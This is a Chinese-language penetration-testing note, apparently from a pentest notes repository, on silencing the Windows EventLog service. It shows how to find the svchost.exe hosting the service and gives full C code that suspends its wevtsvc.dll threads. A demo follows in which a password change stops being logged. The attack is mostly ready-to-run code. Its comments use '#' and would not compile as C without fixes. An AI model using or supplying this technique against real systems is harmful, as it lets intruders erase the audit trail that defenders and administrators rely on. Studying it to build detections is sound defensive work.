	Windows事件日志由svchost.exe托管处理。EventLog
	如果我们列出svchost进程，则会看到许多这样的进程：
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/815.png)

	从上面的屏幕截图中，尚不清楚哪个进程真正托管了该服务，但是如果我们继续在Process Hacker中逐个检查进程，我们最终将找到托管该服务的进程，当前为pid 2196：EventLog svchost.exe
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/816.png)

	通过以下命令获得eventlog的进程ID
	Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/817.png)

	如果我们查看的svchost.exe线程，则会看到
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/818.png)

	下面显示的是，确实，暂停足以使EventLog服务无法注册任何新事件：
	没有挂起时修改个密码
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/819.png)

	会注册新的事件
	挂起时则没有新的事件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/820.png)

	代码实现
	下面是在较高级别下工作的技术代码：
	1.使用OpenSCManagerA命令打开服务控制管理器的句柄 
	2.使用OpenServiceA命令打开EventLog服务的句柄 
	3.使用QueryServiceStatusEx命令检索svchost.exe（托管EventLog）进程ID
	4.打开svchost.exe进程的句柄（从第3步开始）
	5.获取由svchost.exe加载的已加载模块的列表 EnumProcessModules
	6.循环浏览在步骤5中检索到的已加载模块列表，使用查找其名称并找到模块的基地址-这是包含服务内部工作的模块
	7.获取模块信息。它将返回带有模块的起始地址-我们稍后将在确定服务线程是否落入wevtsvc.dll模块的内存空间时需要这些详细信息wevtsvc.dll   GetModuleInformation EventLog
	8.枚举svchost.exe内的所有线程。Thread32FirstThread32Next
	9.对于步骤8中的每个线程，使用NtQueryInformationThread命令检索线程的起始地址 
	10.对于步骤8中的每个线程，检查线程的起始地址是否属于svchost.exe内部的内存空间。wevtsvc.dll
	11.如果线程的起始地址在内存空间内，则这是我们的目标线程，我们将其挂起wevtsvc.dll SuspendThread
	12.EventLog 服务现已禁用
```c
#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <dbghelp.h>
#include <winternl.h>
#pragma comment(lib, "DbgHelp")
using myNtQueryInformationThread = NTSTATUS(NTAPI*)(
IN HANDLE ThreadHandle,
IN THREADINFOCLASS ThreadInformationClass,
OUT PVOID ThreadInformation,
IN ULONG ThreadInformationLength,
OUT PULONG ReturnLength
);
int main()
{
HANDLE serviceProcessHandle;
HANDLE snapshotHandle;
HANDLE threadHandle;
HMODULE modules[256] = {};
SIZE_T modulesSize = sizeof(modules);
DWORD modulesSizeNeeded = 0;
DWORD moduleNameSize = 0;
SIZE_T modulesCount = 0;
WCHAR remoteModuleName[128] = {};
HMODULE serviceModule = NULL;
MODULEINFO serviceModuleInfo = {};
DWORD_PTR threadStartAddress = 0;
DWORD bytesNeeded = 0;
myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread"));
THREADENTRY32 threadEntry;
threadEntry.dwSize = sizeof(THREADENTRY32);
SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
SC_HANDLE service = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);
SERVICE_STATUS_PROCESS serviceStatusProcess = {};
# Get PID of svchost.exe that hosts EventLog service
QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);
DWORD servicePID = serviceStatusProcess.dwProcessId;
# Open handle to the svchost.exe
serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);
snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
# Get a list of modules loaded by svchost.exe
EnumProcessModules(serviceProcessHandle, modules, modulesSize, &modulesSizeNeeded);
modulesCount = modulesSizeNeeded / sizeof(HMODULE);
for (size_t i = 0; i < modulesCount; i++)
{
serviceModule = modules[i];
# Get loaded module's name
GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName));
if (wcscmp(remoteModuleName, L"wevtsvc.dll") == 0)
{
printf("Windows EventLog module %S at %p\n\n", remoteModuleName, serviceModule);
GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));
}
}
# Enumerate threads
Thread32First(snapshotHandle, &threadEntry);
while (Thread32Next(snapshotHandle, &threadEntry))
{
if (threadEntry.th32OwnerProcessID == servicePID)
{
threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);
# Check if thread's start address is inside wevtsvc.dll memory range
if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)
{
printf("Suspending EventLog thread %d with start address %p\n", threadEntry.th32ThreadID, threadStartAddress);
# Suspend EventLog service thread
SuspendThread(threadHandle);
Sleep(2000);
}
}
}
return 0;
}

```
	以下演示
	net user ola ola执行并更改用户的ola密码，并在6:55:30 PM记录事件4724
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/821.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/822.png)

	执行文件，svchost.exe中暂停了4个EventLog线程
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/823.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/824.png)

	再次执行修改密码命令
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/825.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/826.png)

	新的事件没有写入，只有挂起前的事件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/827.png)
